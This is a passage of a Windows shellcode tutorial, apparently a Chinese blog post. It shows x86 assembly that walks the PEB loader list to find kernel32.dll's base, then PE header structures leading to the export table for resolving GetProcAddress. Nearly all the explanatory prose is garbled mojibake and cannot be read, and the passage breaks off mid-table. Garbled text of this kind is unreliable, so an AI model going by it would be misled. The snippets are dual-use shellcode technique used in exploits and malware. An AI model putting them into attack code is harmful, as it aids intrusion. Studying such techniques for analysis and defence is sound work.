æ˜¯ä»£è¡¨æŒ‡å‘GDTè¡¨ä¸­çš„ä¸åŒæ®µã€‚</p><blockquote><p>å½“è¿è¡Œåœ¨R3ä¸‹æ—¶,FSæŒ‡å‘çš„æ®µæ˜¯GDTä¸­çš„0x3Bæ®µ.è¯¥æ®µçš„é•¿åº¦ä¸º4K,åŸºåœ°å€ä¸ºå½“å‰çº¿ç¨‹çš„çº¿ç¨‹ç¯å¢ƒå—ï¼ˆTEBï¼‰ï¼Œæ‰€ä»¥è¯¥æ®µä¹Ÿè¢«ç§°ä¸ºâ€œTEBæ®µâ€<br>å½“è¿è¡Œåœ¨R0ä¸‹æ—¶, FSæŒ‡å‘çš„æ®µæ˜¯GDTä¸­çš„0x30æ®µ.è¯¥æ®µçš„é•¿åº¦ä¹Ÿä¸º4K,åŸºåœ°å€ä¸º0xFFDFF000.è¯¥åœ°å€æŒ‡å‘ç³»ç»Ÿçš„å¤„ç†å™¨æ§åˆ¶åŒºåŸŸï¼ˆKPCRï¼‰</p></blockquote><p><strong>ä»ä»¥ä¸Šå¯å¾—çŸ¥ï¼Œæˆ‘ä»¬å¦‚ä½•å»æ‰¾PEBçš„åŸºåœ°å€ï¼Ÿ</strong></p><p>åœ¨R3çŠ¶æ€ä¸‹çš„FSå¯„å­˜å™¨å­˜çš„å€¼å°±æ˜¯PEBè¡¨åŸºåœ°å€ï¼ŒåŠ ä¸Šåç§»é‡0X30ï¼Œå°±å¾—åˆ°äº†PEBçš„åœ°å€ï¼Œä¸Šæ±‡ç¼–ä»£ç ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax,fs:[ecx + 0x30];PEB</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°äº†PEBè¡¨ï¼Œç„¶åé€šè¿‡PEBåŠ ä¸Šåç§»0xCå¾—åˆ°PPEB_LDR_DATA [Ldr]ç»“æ„ä½“çš„åœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax, [eax + 0xc] ;PEB-&gt;Ldr</span><br></pre></td></tr></table></figure><p>å†åç§»0x14ï¼Œæ‰¾åˆ°InMemoryOrderLinks</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov esi,[eax+0x14];PEB-&gt;Ldr-&gt;InMemoryOrderModuleList</span><br></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬çš„å¯„å­˜å™¨æ”¾çš„å€¼å°±æ˜¯InMemoryOrderModuleListåœ°å€å“Ÿï¼Œä½†æ˜¯æˆ‘ä»¬æƒ³è¦çš„kernel32.dllå¤„äºç¬¬ä¸‰ä¸ªæ¨¡å—ï¼ˆå›ºå®šä½ç½®ï¼Œç¬¬ä¸‰ï¼‰ï¼Œæˆ‘ä»¬å‰é¢è®²äº†åœ¨LIST_ENTRYç»“æ„ä½“ä¸­ï¼Œå¯ä»¥é€šè¿‡Flinkå’ŒBlinkæŒ‡é’ˆè¿›è¡Œæ¨¡å—çš„åˆ‡æ¢ï¼Œè€ŒInMemoryOrderModuleListä¾¿æ˜¯LIST_ENTRYç»“æ„ä½“æŒ‡é’ˆï¼Œè€ŒInMemoryOrderModuleListæŒ‡å‘çš„å°±æ˜¯LIST_ENTRYç»“æ„ä½“ä¸­çš„InMemoryOrderLinksï¼ˆFlinkæŒ‡é’ˆï¼‰å­—æ®µï¼Œæˆ‘ä»¬é€šè¿‡InMemoryOrderLinksï¼ˆFlinkæŒ‡é’ˆï¼‰å­—æ®µæ¥éå†åˆ°Kernel32.dllæ¨¡å—ã€‚</p><blockquote><p>lodsdæŒ‡ä»¤ï¼šä¼šæŠŠesiå¯„å­˜å™¨æŒ‡å‘çš„åœ°å€è¯»å–åŒå­—ï¼Œç„¶åæŠŠç»“æœå­˜æ”¾åœ¨eaxå¯„å­˜å™¨<br>xchgæŒ‡ä»¤ï¼šäº¤æ¢å¯„å­˜å™¨ä¸­çš„å€¼</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lodsd; è¯»å–ç¬¬äºŒä¸ªæ¨¡å—çš„åœ°å€</span><br><span class="line">xchg eax,esi</span><br><span class="line">lodsd;è¯»å–ç¬¬ä¸‰æ¨¡å—çš„åœ°å€</span><br><span class="line">mov ebx,[eax+0x10];è·å¾—kernel32.dllbaseåœ°å€</span><br><span class="line">push ebx</span><br></pre></td></tr></table></figure><p>å› ä¸ºInMemoryOrderLinksåœ¨LIST_ENTRYåç§»ä¸º0x8,è€Œdllbaseä¸º0x18ï¼Œæ‰€ä»¥InMemoryOrderLinksåˆ°dllbaseåªéœ€è¦åç§»0x10,è¿™é‡Œæˆ‘ä»¬å°±æ‰¾åˆ°äº†kernel32.dll baseåœ°å€ã€‚</p><p><strong>å¦‚ä½•é€šè¿‡kernel32.dllåœ°å€æ‰¾åˆ° GetProcAddresså‡½æ•°åœ°å€ï¼Ÿ</strong></p><p>è¿™é‡Œéœ€è¦è§£ækernel32.DLLæ–‡ä»¶çš„PEå¤´æ‰¾åˆ°å¯¼å‡ºè¡¨(å‰é¢å°±è¯´äº†ï¼Œdllæ–‡ä»¶ä¹Ÿæ˜¯PEæ–‡ä»¶æ ¼å¼)ï¼Œéœ€è¦æ‰¾åˆ°PEå¤´ï¼Œåœ¨PEæ–‡ä»¶ç»“æ„ä¸­ï¼Œæ˜¯ç”¨IMAGE_DOS_HEADERç»“æ„ä½“æ¥å®šä¹‰DOSæ–‡ä»¶å¤´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_DOS_HEADER &#123;      &#x2F;&#x2F; DOS .EXE header</span><br><span class="line">    WORD   e_magic;             &#x2F;&#x2F; 00000000  4D 5Aï¼ŒMagic number</span><br><span class="line">    WORD   e_cblp;             &#x2F;&#x2F; 00000002  90 00ï¼ŒBytes on last page of file</span><br><span class="line">    WORD   e_cp;               &#x2F;&#x2F; 00000004  03 00ï¼ŒPages in file</span><br><span class="line">    WORD   e_crlc;            &#x2F;&#x2F; 00000006  00 00ï¼ŒRelocations</span><br><span class="line">    WORD   e_cparhdr;           &#x2F;&#x2F; 00000008  04 00ï¼ŒSize of header in paragraphs</span><br><span class="line">    WORD   e_minalloc;        &#x2F;&#x2F; 0000000A  00 00ï¼ŒMinimum extra paragraphs needed</span><br><span class="line">    WORD   e_maxalloc;          &#x2F;&#x2F; 0000000C  FF FFï¼ŒMaximum extra paragraphs needed</span><br><span class="line">    WORD   e_ss;                &#x2F;&#x2F; 0000000E  00 00ï¼ŒInitial (relative) SS value</span><br><span class="line">    WORD   e_sp;             &#x2F;&#x2F; 00000010  B8 00ï¼ŒInitial SP value</span><br><span class="line">    WORD   e_csum;          &#x2F;&#x2F; 00000012  00 00ï¼ŒChecksum</span><br><span class="line">    WORD   e_ip;                &#x2F;&#x2F; 00000014  00 00ï¼ŒInitial IP value</span><br><span class="line">    WORD   e_cs;                &#x2F;&#x2F; 00000016  00 00ï¼ŒInitial (relative) CS value</span><br><span class="line">    WORD   e_lfarlc;        &#x2F;&#x2F; 00000018  40 00ï¼ŒFile address of relocation table</span><br><span class="line">    WORD   e_ovno;           &#x2F;&#x2F; 0000001A  00 00ï¼ŒOverlay number</span><br><span class="line">WORD   e_res[4];            &#x2F;&#x2F; 0000001C  00 00 00 00ï¼ŒReserved words</span><br><span class="line">        &#x2F;&#x2F; 00000020  00 00 00 00</span><br><span class="line">    WORD   e_oemid;             &#x2F;&#x2F; 00000024  00 00ï¼ŒOEM identifier (for e_oeminfo)</span><br><span class="line">    WORD   e_oeminfo;           &#x2F;&#x2F; 00000026  00 00ï¼ŒOEM information; e_oemid specific</span><br><span class="line">WORD   e_res2[10];          &#x2F;&#x2F; 00000028  00 00 00 00ï¼ŒReserved words</span><br><span class="line">        &#x2F;&#x2F; 0000002C  00 00 00 00</span><br><span class="line">        &#x2F;&#x2F; 00000030  00 00 00 00</span><br><span class="line">        &#x2F;&#x2F; 00000034  00 00 00 00</span><br><span class="line">        &#x2F;&#x2F; 00000038  00 00 00 00</span><br><span class="line">    LONG    e_lfanew;           &#x2F;&#x2F; 0000003C  F8 00 00 00ï¼ŒFile address of new exe header</span><br><span class="line">&#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­æœ‰ç”¨çš„ä¸¤ä¸ªå­—æ®µï¼Œåˆ†åˆ«æ˜¯e_magicå’Œe_lfanewï¼Œä¸€ä¸ªæ˜¯dos ç­¾åï¼šæ ‡å¿—è¿™æ˜¯doså¤´ï¼Œä¸€ä¸ªè®°è½½PEå¤´çš„åœ¨æ–‡ä»¶ä¸­åç§»ï¼Œæˆ‘ä»¬è¦æ‹¿åˆ°e_lfanewå€¼ï¼Œé€šè¿‡å®ƒæ¥æ‰¾åˆ°NTæ–‡ä»¶å¤´ï¼Œè¿™é‡Œåç§»é‡ä¸º0x3c</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov edx,[ebx+0x3c];e_lfanew</span><br><span class="line">add edx,ebx;åŠ ä¸ŠåŸºåœ°å€ï¼Œå¾—åˆ°äº†PEheaderåœ°å€</span><br></pre></td></tr></table></figure><p>æ¥çœ‹çœ‹NTæ–‡ä»¶å¤´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_NT_HEADERS64 &#123;</span><br><span class="line">    DWORD Signature;&#x2F;&#x2F;Signature PEæ–‡ä»¶æ ‡è¯†ï¼Œè¢«å®šä¹‰ä¸º00004550</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;&#x2F;&#x2F;FileHeader,è¯¥ç»“æ„æŒ‡å‘IMAGE_FILE_HEADERã€‚</span><br><span class="line">    IMAGE_OPTIONAL_HEADER64 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;</span><br><span class="line">typedef struct _IMAGE_NT_HEADERS &#123;</span><br><span class="line">    DWORD Signature;</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;&#x2F;&#x2F;OptionalHeader,è¯¥ç»“æ„æŒ‡å‘_IMAGE_OPTIONAL_HEADER32,Windowsæ“ä½œç³»ç»Ÿå¯æ‰§è¡Œæ–‡ä»¶çš„å¤§éƒ¨åˆ†ç‰¹æ€§å‡åœ¨è¿™ä¸ªç»“æ„é‡Œé¢å‘ˆç°</span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br><span class="line">#ifdef _WIN64</span><br><span class="line">typedef IMAGE_NT_HEADERS64                  IMAGE_NT_HEADERS;</span><br><span class="line">typedef PIMAGE_NT_HEADERS64                PIMAGE_NT_HEADERS;</span><br><span class="line">#else</span><br><span class="line">typedef IMAGE_NT_HEADERS32                  IMAGE_NT_HEADERS;</span><br><span class="line">typedef PIMAGE_NT_HEADERS32                PIMAGE_NT_HEADERS;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯32ä½çš„ï¼Œä¸€ç§æ˜¯64ä½çš„ï¼Œå› ä¸ºæˆ‘è¿™é‡Œæ˜¯æ‹¿çš„c++ä¸­é‡Œé¢çš„åº“é‡Œé¢çš„ç»“æ„ä½“å®šä¹‰ï¼Œç›´æ¥å¤åˆ¶ç²˜è´´è¿‡æ¥äº†ï¼Œç»“æ„ä¸Šå¤§ä½“ä¸€æ ·ï¼Œè¿™é‡ŒOptionalHeader æŒ‡å‘ç€é€‰é¡¹å¤´</p><p>æ¥çœ‹çœ‹é€‰é¡¹å¤´ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_OPTIONAL_HEADER &#123;</span><br><span class="line">     WORD    Magic;                   &#x2F;&#x2F; æ ‡å¿—å­—, ROM æ˜ åƒï¼ˆ0107hï¼‰,æ™®é€šå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆ010Bhï¼‰</span><br><span class="line">&#x2F;*Magicå­—æ®µ ï¼šè¯´æ˜æ–‡ä»¶çš„ç±»å‹ï¼Œå¦‚æœä¸º010Bhï¼Œè¡¨é¢æ–‡ä»¶ä¸ºPE32ï¼›å¦‚æœä¸º0107h,è¡¨æ˜æ–‡ä»¶ä¸ºROMæ˜ åƒï¼›å¦‚æœä¸º20Bh,è¡¨é¢æ–‡ä»¶ä¸ºPE64.*&#x2F;</span><br><span class="line">     BYTE    MajorLinkerVersion;      &#x2F;&#x2F; é“¾æ¥ç¨‹åºçš„ä¸»ç‰ˆæœ¬å·</span><br><span class="line">     BYTE    MinorLinkerVersion;      &#x2F;&#x2F; é“¾æ¥ç¨‹åºçš„æ¬¡ç‰ˆæœ¬å·</span><br><span class="line">     DWORD   SizeOfCode;              &#x2F;&#x2F; æ‰€æœ‰å«ä»£ç çš„èŠ‚çš„æ€»å¤§å°</span><br><span class="line">     DWORD   SizeOfInitializedData;   &#x2F;&#x2F; æ‰€æœ‰å«å·²åˆå§‹åŒ–æ•°æ®çš„èŠ‚çš„æ€»å¤§å°</span><br><span class="line">     DWORD   SizeOfUninitializedData; &#x2F;&#x2F; æ‰€æœ‰å«æœªåˆå§‹åŒ–æ•°æ®çš„èŠ‚çš„å¤§å°</span><br><span class="line">     DWORD   AddressOfEntryPoint;     &#x2F;&#x2F; ç¨‹åºæ‰§è¡Œå…¥å£RVA</span><br><span class="line">     DWORD   BaseOfCode;              &#x2F;&#x2F; ä»£ç çš„åŒºå—çš„èµ·å§‹RVA</span><br><span class="line">     DWORD   BaseOfData;              &#x2F;&#x2F; æ•°æ®çš„åŒºå—çš„èµ·å§‹RVA  </span><br><span class="line">     DWORD   ImageBase;               &#x2F;&#x2F; ç¨‹åºçš„é¦–é€‰è£…è½½åœ°å€</span><br><span class="line">&#x2F;*ImageBaseå­—æ®µ æŒ‡å‡ºæ–‡ä»¶çš„ä¼˜å…ˆè£…å…¥åœ°å€ã€‚ä¹Ÿå°±æ˜¯è¯´å½“æ–‡ä»¶è¢«æ‰§è¡Œæ—¶ï¼Œå¦‚æœå¯èƒ½çš„è¯ï¼ŒWindowsä¼˜å…ˆå°†æ–‡ä»¶è£…å…¥åˆ°ç”±ImageBaseå­—æ®µæŒ‡å®šçš„åœ°å€ä¸­ã€‚åªæœ‰æŒ‡å®šçš„åœ°å€å·²ç»è¢«**æ¨¡å—</span><br><span class="line">ä½¿ç”¨æ—¶ï¼Œæ–‡ä»¶æ‰è¢«è£…å…¥åˆ°**åœ°å€ä¸­ã€‚é“¾æ¥å™¨äº§ç”Ÿå¯æ‰§è¡Œæ–‡ä»¶çš„æ—¶å€™å¯¹åº”è¿™ä¸ªåœ°å€æ¥ç”Ÿæˆæœºå™¨ç ï¼Œæ‰€ä»¥å½“æ–‡ä»¶è¢«è£…å…¥è¿™ä¸ªåœ°å€æ—¶ä¸éœ€è¦è¿›è¡Œé‡å®šä½æ“ä½œï¼Œè£…å…¥çš„é€Ÿåº¦æœ€å¿«ã€‚å¦‚æœæ–‡ä»¶</span><br><span class="line">è¢«è£…è½½åˆ°**åœ°å€çš„è¯ï¼Œå°†ä¸å¾—ä¸è¿›è¡Œé‡å®šä½æ“ä½œï¼Œè¿™æ ·å°±è¦æ…¢ä¸€ç‚¹ã€‚å¯¹äºEXEæ–‡ä»¶æ¥è¯´ï¼Œç”±äºæ¯ä¸ªæ–‡ä»¶æ€»æ˜¯ä½¿ç”¨ç‹¬ç«‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œä¼˜å…ˆè£…å…¥åœ°å€ä¸å¯èƒ½è¢«**æ¨¡å—å æ®ï¼Œæ‰€ä»¥EXE</span><br><span class="line">æ€»æ˜¯èƒ½å¤ŸæŒ‰ç…§è¿™ä¸ªåœ°å€è£…å…¥ã€‚è¿™ä¹Ÿæ„å‘³ç€EXEæ–‡ä»¶ä¸å†éœ€è¦é‡å®šä½ä¿¡æ¯ã€‚å¯¹äºDLLæ–‡ä»¶æ¥è¯´ï¼Œç”±äºå¤šä¸ªDLLæ–‡ä»¶å…¨éƒ¨ä½¿ç”¨å®¿ä¸»EXEæ–‡ä»¶çš„åœ°å€ç©ºé—´ï¼Œä¸èƒ½ä¿è¯ä¼˜å…ˆè£…å…¥åœ°å€æ²¡æœ‰è¢«**çš„</span><br><span class="line">DLLä½¿ç”¨ï¼Œæ‰€ä»¥DLLæ–‡ä»¶ä¸­å¿…é¡»åŒ…å«é‡å®šä½ä¿¡æ¯ä»¥é˜²ä¸‡ä¸€ã€‚å› æ­¤ï¼Œåœ¨å‰é¢ä»‹ç»çš„ IMAGE_FILE_HEADER ç»“æ„çš„ Characteristics å­—æ®µä¸­ï¼ŒDLL æ–‡ä»¶å¯¹åº”çš„ IMAGE_FILE_RELOCS_STRIPPED </span><br><span class="line">ä½æ€»æ˜¯ä¸º0ï¼Œè€ŒEXEæ–‡ä»¶çš„è¿™ä¸ªæ ‡å¿—ä½æ€»æ˜¯ä¸º1ã€‚åœ¨é“¾æ¥çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡å¯¹link.exeæŒ‡å®š&#x2F;base:addressé€‰é¡¹æ¥è‡ªå®šä¹‰ä¼˜å…ˆè£…å…¥åœ°å€ï¼Œå¦‚æœä¸æŒ‡å®šè¿™ä¸ªé€‰é¡¹çš„è¯ï¼Œä¸€èˆ¬EXEæ–‡ä»¶çš„é»˜è®¤</span><br><span class="line">ä¼˜å…ˆè£…å…¥åœ°å€è¢«å®šä¸º00400000hï¼Œè€ŒDLLæ–‡ä»¶çš„é»˜è®¤ä¼˜å…ˆè£…å…¥åœ°å€è¢«å®šä¸º10000000hã€‚*&#x2F; </span><br><span class="line">     DWORD   SectionAlignment;        &#x2F;&#x2F; å†…å­˜ä¸­çš„åŒºå—çš„å¯¹é½å¤§å°</span><br><span class="line">     DWORD   FileAlignment;    &#x2F;&#x2F; æ–‡ä»¶ä¸­çš„åŒºå—çš„å¯¹é½å¤§å°</span><br><span class="line">    WORD    MajorOperatingSystemVersion;  &#x2F;&#x2F; è¦æ±‚æ“ä½œç³»ç»Ÿæœ€ä½ç‰ˆæœ¬å·çš„ä¸»ç‰ˆæœ¬å·</span><br><span class="line">    WORD    MinorOperatingSystemVersion;  &#x2F;&#x2F; è¦æ±‚æ“ä½œç³»ç»Ÿæœ€ä½ç‰ˆæœ¬å·çš„å‰¯ç‰ˆæœ¬å·</span><br><span class="line"></span><br><span class="line">    WORD    MajorImageVersion;       &#x2F;&#x2F; æœ¬PEæ–‡ä»¶æ˜ åƒçš„ä¸»ç‰ˆæœ¬å·</span><br><span class="line">    WORD    MinorImageVersion;       &#x2F;&#x2F; æœ¬PEæ–‡ä»¶æ˜ åƒçš„æ¬¡ç‰ˆæœ¬å·</span><br><span class="line">    WORD    MajorSubsystemVersion;   &#x2F;&#x2F; è¿è¡Œæ‰€éœ€è¦çš„å­ç³»ç»Ÿçš„ä¸»ç‰ˆæœ¬å·</span><br><span class="line">    WORD    MinorSubsystemVersion;   &#x2F;&#x2F; è¿è¡Œæ‰€éœ€è¦çš„å­ç³»ç»Ÿçš„æ¬¡ç‰ˆæœ¬å·</span><br><span class="line">    DWORD   Win32VersionValue;       &#x2F;&#x2F; å­ç³»ç»Ÿç‰ˆæœ¬å·ï¼Œæš‚æ—¶ä¿ç•™æœªç”¨ã€‚å¿…é¡»è®¾ç½®ä¸º0</span><br><span class="line">    DWORD   SizeOfImage;             &#x2F;&#x2F; æ˜ åƒè£…å…¥å†…å­˜åçš„æ€»å°ºå¯¸    +54h </span><br><span class="line">    DWORD   SizeOfHeaders;           &#x2F;&#x2F; æ‰€æœ‰å¤´ + åŒºå—è¡¨çš„å°ºå¯¸å¤§å°</span><br><span class="line"></span><br><span class="line">    DWORD   CheckSum;                &#x2F;&#x2F; æ˜ åƒçš„æ ¡æ£€å’Œ       +5Ch    </span><br><span class="line">    WORD    Subsystem;               &#x2F;&#x2F; å¯æ‰§è¡Œæ–‡ä»¶æœŸæœ›çš„å­ç³»ç»Ÿ  è¡¨3-4</span><br><span class="line">    WORD    DllCharacteristics;      &#x2F;&#x2F; Dllæ–‡ä»¶å±æ€§ +60h     è¡¨3-6  </span><br><span class="line"></span><br><span class="line">         DWORD   SizeOfStackReserve;      &#x2F;&#x2F; åˆå§‹åŒ–æ—¶ä¿ç•™çš„æ ˆå¤§å°</span><br><span class="line">    DWORD   SizeOfStackCommit;       &#x2F;&#x2F; åˆå§‹åŒ–æ—¶å®é™…æäº¤çš„æ ˆå¤§å°    +68h  </span><br><span class="line"></span><br><span class="line">         DWORD   SizeOfHeapReserve;       &#x2F;&#x2F; åˆå§‹åŒ–æ—¶ä¿ç•™çš„å †å¤§å°</span><br><span class="line">    DWORD   SizeOfHeapCommit;        &#x2F;&#x2F; åˆå§‹åŒ–æ—¶å®é™…æäº¤çš„å †å¤§å°    +70h    </span><br><span class="line">&#x2F;*SizeOfHeapCommitå­—æ®µï¼šåˆå§‹åŒ–æ—¶æäº¤çš„å †å¤§å°ï¼Œåœ¨è¿›ç¨‹åˆå§‹åŒ–æ—¶è®¾å®šçš„å †æ‰€å ç”¨çš„å†…å­˜ç©ºé—´ã€‚é»˜è®¤å€¼ä¸º1é¡µã€‚*&#x2F;</span><br><span class="line">         DWORD   LoaderFlags;             &#x2F;&#x2F; åŠ è½½æ ‡å¿—   ä¸è°ƒè¯•æœ‰å…³ï¼Œé»˜è®¤ä¸º 0 </span><br><span class="line">    DWORD   NumberOfRvaAndSizes;     &#x2F;&#x2F; ä¸‹è¾¹æ•°æ®ç›®å½•çš„é¡¹æ•°ï¼Œè¿™ä¸ªå­—æ®µè‡ªWindows NT å‘å¸ƒä»¥æ¥ä¸€ç›´æ˜¯16</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];   &#x2F;&#x2F; æ•°æ®ç›®å½•è¡¨</span><br><span class="line">&#x2F;*DataDirectoryå­—æ®µ è¿™ä¸ªå­—æ®µå¯ä»¥è¯´æ˜¯æœ€é‡è¦çš„å­—æ®µä¹‹ä¸€ï¼Œå®ƒç”±16ä¸ªç›¸åŒçš„IMAGE_DATA_DIRECTORYç»“æ„ç»„æˆã€‚è™½ç„¶PEæ–‡ä»¶ä¸­çš„æ•°æ®æ˜¯æŒ‰ç…§è£…å…¥å†…å­˜åçš„é¡µå±æ€§å½’ç±»è€Œè¢«æ”¾åœ¨ä¸åŒ</span><br><span class="line">çš„èŠ‚ä¸­çš„ï¼Œä½†æ˜¯è¿™äº›å¤„äºå„ä¸ªèŠ‚ä¸­çš„æ•°æ®æŒ‰ç…§ç”¨é€”å¯ä»¥è¢«åˆ†ä¸ºå¯¼å‡ºè¡¨ã€å¯¼å…¥è¡¨ã€èµ„æºã€é‡å®šä½è¡¨ç­‰æ•°æ®å—ï¼Œè¿™16ä¸ªIMAGE_DATA_DIRECTORYç»“æ„å°±æ˜¯ç”¨æ¥å®šä¹‰å¤šç§ä¸åŒç”¨é€”çš„</span><br><span class="line">æ•°æ®å—çš„ã€‚*&#x2F;</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„DataDirectoryå­—æ®µæ˜¯æˆ‘ä»¬éœ€è¦æ³¨æ„çš„ï¼Œå› ä¸ºåœ¨è¿™ä¸ªå­—æ®µä¸­æœ‰å¯¼å‡ºè¡¨çš„æ•°æ®å—ï¼Œç®—ç®—è¯¥å­—æ®µçš„åç§»ï¼Œ0x78</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov edx, [edx + 0x78]</span><br><span class="line">add edx, ebx;export table addr</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ¥çœ‹çœ‹æ•°æ®ç›®å½•ï¼ŒIMAGE_DATA_DIRECTORYç»“æ„ä½“ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _IMAGE_DATA_DIRECTORY &#123;</span><br><span class="line">  DWORD VirtualAddress;&#x2F;&#x2F;RVA</span><br><span class="line">  DWORD Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure><p>å®šä¹‰éå¸¸ç®€å•ï¼Œä½†å®ƒä»…ä»…æŒ‡å‡ºäº†æŸç§æ•°æ®å—çš„ä½ç½®å’Œé•¿åº¦ï¼Œçœ‹ä¸€ä¸‹ç´¢å¼•æ‰€ä»£è¡¨çš„å«ä¹‰ï¼š</p><table><thead><tr><th>ç´¢ å¼•</th><th>ç´¢å¼•å€¼åœ¨Windows.incä¸­çš„é¢„å®šä¹‰å€¼</th><th>å¯¹åº”çš„æ•°æ®å—</th></tr></thead><tbody><tr><td>0</td><td>IMAGE_DIRECTORY_ENTRY_EXPORT</td><td>å¯¼å‡ºè¡¨</td></tr><tr><td>1</td><td>IMAGE_DIRECTORY_ENTRY_IMPORT</td><td>å¯¼å…¥è¡¨</td></tr><tr><td>2</td><td>IMAGE_DIRECTORY_ENTRY_RESOURCE</td><td>èµ„æº</td></tr><tr><td>3</td><td>IMAGE_DIRECTORY_ENTRY_EXCEPTION</td><td>å¼‚å¸¸ï¼ˆå…·ä½“èµ„æ–™ä¸è¯¦ï¼‰</td></tr><tr><td>4</td><td>IMAGE_DIRECTORY_ENTRY_SECURITY</td><td>å®‰å…¨ï¼ˆå…·ä½“èµ„æ–™ä¸è¯¦ï¼‰</td></tr><tr><td>5</td><td>IMAGE_DIRECTORY_ENTRY_BASERELOC</td><td>é‡å®šä½è¡¨</td></tr><tr><td>6</td><td>IMAGE_DIRECTORY_ENTRY_DEBUG</td><td>è°ƒè¯•ä¿¡æ¯</td></tr><tr><td>7</td><td>IMAGE_DIRECTORY_ENTRY_ARCHITECTURE</td><td>ç‰ˆæƒä¿¡æ¯</td></tr><tr><td>8</td><td>IMAGE_DIRECTORY_ENTRY_GLOBALPTR</td><td>å…·ä½“èµ„æ–™ä¸è¯¦</td></tr><tr><td>9</td><td>IMAGE_DIRECTORY_ENTRY_TLS</td><td>Thread Local 